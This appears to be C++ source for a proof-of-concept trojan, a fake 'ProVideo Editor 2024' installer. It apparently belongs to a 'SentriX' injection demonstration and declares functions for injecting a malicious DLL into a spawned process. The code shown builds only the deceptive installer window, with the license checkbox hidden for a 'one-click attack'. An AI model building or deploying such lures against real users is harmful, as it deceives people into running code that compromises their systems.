#include "framework.h"
#include "FakeSoftwareInstaller.h"
#include <windows.h>
#include <commctrl.h>
#include <string>
#include <thread>
#include <fstream>
#include <tlhelp32.h>
#include <sstream>

#pragma comment(lib, "comctl32.lib")
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")

// Log file path - consistent with Injector and MaliciousDLL
#define SENTRIX_LOG_FILE "C:\\SentriX_injection_proof.txt"
#define SENTRIX_INSTALLER_LOG "C:\\SentriX_installer_log.txt"

// Window Controls
HWND hwndMain;
HWND hwndWelcomeText;
HWND hwndDescriptionText;
HWND hwndLicenseCheck;
HWND hwndProgressBar;
HWND hwndStatusText;
HWND hwndProgressDetail;
HWND hwndInstallBtn;
HWND hwndCancelBtn;
HWND hwndFinishBtn;

// State
bool isInstalling = false;
bool injectionSuccessful = false;
DWORD spawnedTargetPID = 0;

// Function declarations
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
void CreateControls(HWND hwnd);
void StartInstallation();
void PerformMaliciousInjection();
DWORD GetProcessIdByName(const wchar_t* processName);
DWORD SpawnTargetProcess();
bool InjectDLL(DWORD processId, const char* dllPath);
std::string GetDLLPath();
void LogActivity(const std::string& message);

// Entry point
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
    // Initialize common controls
    INITCOMMONCONTROLSEX icex;
    icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
    icex.dwICC = ICC_PROGRESS_CLASS | ICC_STANDARD_CLASSES;
    InitCommonControlsEx(&icex);

    // Register window class
    const wchar_t CLASS_NAME[] = L"FakeSoftwareInstallerClass";

    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = CreateSolidBrush(RGB(240, 240, 240));
    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);

    RegisterClass(&wc);

    // Create window
    hwndMain = CreateWindowEx(
        0,
        CLASS_NAME,
        L"ProVideo Editor 2024 - Installation Wizard",
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
        CW_USEDEFAULT, CW_USEDEFAULT, 600, 450,
        nullptr,
        nullptr,
        hInstance,
        nullptr
    );

    if (hwndMain == nullptr)
    {
        return 0;
    }

    // Center window on screen
    RECT rect;
    GetWindowRect(hwndMain, &rect);
    int windowWidth = rect.right - rect.left;
    int windowHeight = rect.bottom - rect.top;
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    SetWindowPos(hwndMain, nullptr,
        (screenWidth - windowWidth) / 2,
        (screenHeight - windowHeight) / 2,
        0, 0, SWP_NOSIZE | SWP_NOZORDER);

    CreateControls(hwndMain);

    ShowWindow(hwndMain, nCmdShow);
    UpdateWindow(hwndMain);

    // Message loop
    MSG msg = {};
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}

void CreateControls(HWND hwnd)
{
    HFONT hFontTitle = CreateFont(28, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI");

    HFONT hFontNormal = CreateFont(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI");

    HFONT hFontButton = CreateFont(18, 0, 0, 0, FW_SEMIBOLD, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI");

    // Header background
    HWND hwndHeader = CreateWindow(L"STATIC", L"",
        WS_CHILD | WS_VISIBLE | SS_OWNERDRAW,
        0, 0, 600, 80,
        hwnd, (HMENU)100, nullptr, nullptr);

    // Logo circle (simulated with text)
    HWND hwndLogo = CreateWindow(L"STATIC", L"●",
        WS_CHILD | WS_VISIBLE | SS_CENTER,
        20, 15, 50, 50,
        hwnd, nullptr, nullptr, nullptr);
    SendMessage(hwndLogo, WM_SETFONT, (WPARAM)CreateFont(48, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI"), TRUE);

    // Title in header
    HWND hwndHeaderTitle = CreateWindow(L"STATIC", L"ProVideo Editor 2024",
        WS_CHILD | WS_VISIBLE,
        80, 20, 400, 30,
        hwnd, nullptr, nullptr, nullptr);
    SendMessage(hwndHeaderTitle, WM_SETFONT, (WPARAM)hFontTitle, TRUE);

    // Subtitle
    HWND hwndSubtitle = CreateWindow(L"STATIC", L"Professional Video Editing Software",
        WS_CHILD | WS_VISIBLE,
        80, 50, 400, 20,
        hwnd, nullptr, nullptr, nullptr);
    SendMessage(hwndSubtitle, WM_SETFONT, (WPARAM)hFontNormal, TRUE);

    // Welcome text
    hwndWelcomeText = CreateWindow(L"STATIC", L"Welcome to ProVideo Editor Setup",
        WS_CHILD | WS_VISIBLE,
        40, 120, 520, 30,
        hwnd, nullptr, nullptr, nullptr);
    SendMessage(hwndWelcomeText, WM_SETFONT, (WPARAM)CreateFont(22, 0, 0, 0, FW_SEMIBOLD, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI"), TRUE);

    // Description
    hwndDescriptionText = CreateWindow(L"STATIC",
        L"Ready to install ProVideo Editor 2024.\r\n\r\nClick 'Install' to start the installation.",
        WS_CHILD | WS_VISIBLE,
        40, 160, 520, 60,
        hwnd, nullptr, nullptr, nullptr);
    SendMessage(hwndDescriptionText, WM_SETFONT, (WPARAM)hFontNormal, TRUE);

    // License checkbox - HIDDEN (not needed for one-click attack)
    hwndLicenseCheck = CreateWindow(L"BUTTON", L"I accept the terms and conditions",
        WS_CHILD | BS_AUTOCHECKBOX,  // Removed WS_VISIBLE
        40, 240, 400, 25,
        hwnd, (HMENU)1, nullptr, nullptr);
    SendMessage(hwndLicenseCheck, WM_SETFONT, (WPARAM)hFontNormal, TRUE);

    // Progress bar (hidden initially)
    hwndProgressBar = CreateWindowEx(0, PROGRESS_CLASS, nullptr,
        WS_CHILD | PBS_SMOOTH,
        40, 200, 520, 30,
        hwnd, nullptr, nullptr, nullptr);

    // Status text (hidden initially)
    hwndStatusText = CreateWindow(L"STATIC", L"Installing...",
        WS_CHILD,
        40, 160, 520, 25,
        hwnd, nullptr, nullptr, nullptr);
    SendMessage(hwndStatusText, WM_SETFONT, (WPARAM)CreateFont(18, 0, 0, 0, FW_SEMIBOLD, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI"), TRUE);

    // Progress detail (hidden initially)
    hwndProgressDetail = CreateWindow(L"STATIC", L"Preparing installation...",
        WS_CHILD,
        40, 240, 520, 20,
        hwnd, nullptr, nullptr, nullptr);
    SendMessage(hwndProgressDetail, WM_SETFONT, (WPARAM)hFontNormal, TRUE);

    // Buttons
    hwndCancelBtn = CreateWindow(L"BUTTON", L"Cancel",
        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
        360, 360, 100, 35,
        hwnd, (HMENU)2, nullptr, nullptr);
    SendMessage(hwndCancelBtn, WM_SETFONT, (WPARAM)hFontButton, TRUE);

    hwndInstallBtn = CreateWindow(L"BUTTON", L"Install",
        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,  // Removed WS_DISABLED - enabled by default
        470, 360, 100, 35,
        hwnd, (HMENU)3, nullptr, nullptr);
    SendMessage(hwndInstallBtn, WM_SETFONT, (WPARAM)hFontButton, TRUE);

    hwndFinishBtn = CreateWindow(L"BUTTON", L"Finish",
        WS_CHILD | BS_PUSHBUTTON,
        470, 360, 100, 35,
        hwnd, (HMENU)4, nullptr, nullptr);
    SendMessage(hwndFinishBtn, WM_SETFONT, (WPARAM)hFontButton, TRUE);
}